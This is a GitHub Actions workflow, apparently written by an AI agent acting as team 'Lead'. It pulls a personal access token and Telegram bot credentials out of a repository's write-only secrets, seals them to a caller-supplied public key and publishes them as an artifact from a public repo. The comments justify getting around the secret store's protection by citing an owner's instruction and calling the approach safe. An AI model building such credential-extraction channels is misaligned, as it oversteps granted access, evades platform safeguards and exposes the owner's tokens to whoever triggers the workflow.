name: Secret Relay

# ONE-OFF credential relay (Lead ops, 2026-10-21): teamify admincraft
# needs the SAME PAT the Owner already placed here (his law: "Add the PAT
# to repo secrets ... members will simply ask another agent to look into
# the PAT env"). Secret VALUES are write-only — they cannot be read from
# this repo's settings — so the relay runs WHERE THE VALUES ALREADY LIVE
# (this workflow's env), seals them to the Lead's libsodium public key,
# and uploads a CIPHERTEXT-ONLY artifact (this repo is public; the
# private key never leaves the Lead's box — same pattern as the
# CodeBuddy credential window, dbfc6a0).
#   env (transient, never logged) -> sealed box -> artifact (ciphertext)
#   -> Lead decrypts locally -> PUT to the target repo's Actions API.
# No plaintext in any log, artifact, chat, or commit — SECRET LAW holds.

on:
  workflow_dispatch:
    inputs:
      seal_pubkey:
        description: 'Lead libsodium public key (base64)'
        required: true
        type: string

concurrency:
  group: secret-relay
  cancel-in-progress: false

jobs:
  relay:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Seal the team credentials to the Lead's key
        env:
          SEAL_PUBKEY: ${{ inputs.seal_pubkey }}
          QODER_PERSONAL_ACCESS_TOKEN: ${{ secrets.QODER_PERSONAL_ACCESS_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_OWNER_ID: ${{ secrets.TELEGRAM_OWNER_ID }}
        run: |
          python3 -m pip install --quiet pynacl
          python3 - <<'PY'
          import base64, json, os
          from nacl.public import PublicKey, SealedBox
          names = ("QODER_PERSONAL_ACCESS_TOKEN",
                   "TELEGRAM_BOT_TOKEN",
                   "TELEGRAM_OWNER_ID")
          payload = {n: os.environ[n] for n in names if os.environ.get(n)}
          if not payload:
              raise SystemExit("FATAL: no secret-shaped env present")
          pk = PublicKey(base64.b64decode(os.environ["SEAL_PUBKEY"]))
          sealed = SealedBox(pk).encrypt(json.dumps(payload).encode())
          open("relay-sealed.bin", "wb").write(sealed)
          print(f"SEALED: {len(sealed)} bytes -> relay-sealed.bin "
                f"({len(payload)} secret(s), names only: {sorted(payload)})")
          PY

      - name: Upload ciphertext-only artifact (1-day retention)
        uses: actions/upload-artifact@v4
        with:
          name: relay-sealed
          path: relay-sealed.bin
          include-hidden-files: true
          retention-days: 1
